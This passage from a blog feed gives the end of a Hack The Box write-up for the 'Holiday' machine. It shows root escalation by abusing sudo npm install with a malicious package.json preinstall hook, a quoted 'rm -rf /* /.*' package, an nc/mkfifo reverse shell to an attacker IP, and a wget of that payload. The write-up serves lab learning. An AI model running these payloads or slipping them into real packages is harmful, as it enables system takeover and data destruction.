+bash: cannot set terminal process group (1137): Inappropriate ioctl for device
+bash: no job control in this shell
+algernon@holiday:~/app$ id &amp;amp;&amp;amp; pwd &amp;amp;&amp;amp; cat /home/algernon/user.txt
+id &amp;amp;&amp;amp; pwd &amp;amp;&amp;amp; cat /home/algernon/user.txt
+uid=1001(algernon) gid=1001(algernon) groups=1001(algernon)
+/home/algernon/app
+5edc176c52673a6e0f087c68c531c743
+algernon@holiday:~/app$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;privesc-to-root&quot;&gt;PrivEsc to root&lt;/h2&gt;
+
+&lt;p&gt;The first thing i checked was the sudo rights with algernon&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;algernon@holiday:~/app$ 
+
+algernon@holiday:~/app$ sudo -l
+sudo -l
+Matching Defaults entries for algernon on holiday:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User algernon may run the following commands on holiday:
+    (ALL) NOPASSWD: /usr/bin/npm i *
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, algernon was able to execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/npm i&lt;/code&gt; without a password, and I already knew that npm install had the ability to run preinstall scripts. So, we can generated a json package:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
+  &quot;scripts&quot;: { &quot;preinstall&quot;: &quot;cat /root/root.txt&quot; }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;algernon@holiday:~$ sudo /usr/bin/npm i --unsafe-perm
+sudo /usr/bin/npm i --unsafe-perm
+
+&amp;gt; undefined preinstall /home/algernon
+&amp;gt; cat /root/root.txt
+
+a844cb50bf88ebbe8412e095a6b642e8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;shell-as-root&quot;&gt;Shell as root&lt;/h2&gt;
+
+&lt;p&gt;Accorging with this link &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://github.com/joaojeronimo/rimrafall&lt;/code&gt; we can run dangerous commands from a package.json with npm.&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rimrafall&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rm -rf /*&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;main&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;index.js&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;preinstall&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rm -rf /* /.*&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;keywords&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rimraf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rmrf&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;author&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;João Jerónimo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;license&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ISC&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So we can adapt this package.json to getting a reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rimrafall&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;version&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;root&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;main&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;index.js&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;preinstall&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bash /tmp/shell&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;keywords&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rimraf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rmrf&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;author&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;João Jerónimo&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;license&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ISC&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With this index.js&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;module.exports = &quot;npm install could be dangerous.&quot;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;algernon@holiday:~/app$ mkdir rimrafall
+algernon@holiday:~/app$ cd rimrafall
+algernon@holiday:~/app/rimrafall$
+algernon@holiday:~/app/rimrafall$ ls
+index.js
+package.json
+algernon@holiday:~/app/rimrafall$ ls
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then our reverse shell&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.14.27 4445 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;algernon@holiday:~/app/rimrafall$ cd /tmp
+algernon@holiday:/tmp$ wget 10.10.14.27:8000/shell
+wget 10.10.14.27:8000/shell
+--2020-04-27 22:46:05--  http://10.10.14.27:8000/shell
+Connecting to 10.10.14.27:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 91 [application/octet-stream]
+Saving to: ‘shell’
+
+     0K                                                       100% 17.5M=0s
+
+2020-04-27 22:46:05 (17.5 MB/s) - ‘shell’ saved [91/91] 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;algernon@holiday:~/app$ sudo npm i rimrafall --unsafe
+
+&amp;gt; rimrafall@1.0.0 preinstall /home/algernon/app/node_modules/.staging/rimrafall-aa0a316f
+&amp;gt; bash /tmp/shell
+
+rm: cannot remove '/tmp/f': No such file or directory
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@lorenzooo ~ -&amp;gt; rlwrap nc -lvnp 4445
+listening on [any] 4445 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.10.10.25] 52106
+/bin/sh: 0: can't access tty; job control turned off
+# id &amp;amp;&amp;amp; cat /root/root.txt
+uid=0(root) gid=0(root) groups=0(root)
+a844cb50bf88ebbe8412e095a6b642e8
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;hack-only-for-fun-and-learning-not-for-profit&quot;&gt;Hack only for fun and learning. Not for profit&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-holiday/holiday24.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Ezploisite</name><email>bomb@protonmail.com</email></author><category term="Holiday" /><category term="SQL Injection" /><category term="XSS Stored" /><category term="Command Injection" /><category term="Sudo npm" /><summary type="html">Holiday was a hard box with a SQL Injection through a post form to retrieve credentials to login. Once gained access, we can stole the admin cookie with an XSS stored in the web page. After that, we can perform command injection through a form, bypassing the regex and obtain the reverse shell on the remote system. For the privesc we have sudo rights with npm to install our malicious json package and getting root shell.</summary></entry><entry><title type="html">Joker - Hack The Box</title><link href="https://ezploisite.it/htb-writeup-joker/" rel="alternate" type="text/html" title="Joker - Hack The Box" /><published>2020-04-25T00:00:00+02:00</published><updated>2020-04-25T00:00:00+02:00</updated><id>https://ezploisite.it/htb-writeup-joker</id><content type="html" xml:base="https://ezploisite.it/htb-writeup-joker/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-joker/jokera.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Joker was a hard box with a Http-Proxy-Squid that allows us through the TFTP to retrieve the username and password. The credentials we retrieve can be used to access the site where, bruteforcing the directories we will find a Python Console. After taking a shell, we will use sudo to create a symlink with our ssh key, to access with the user Alekos. For the privesc we will abuse a crontab which saves archivies as root.&lt;/p&gt;
 
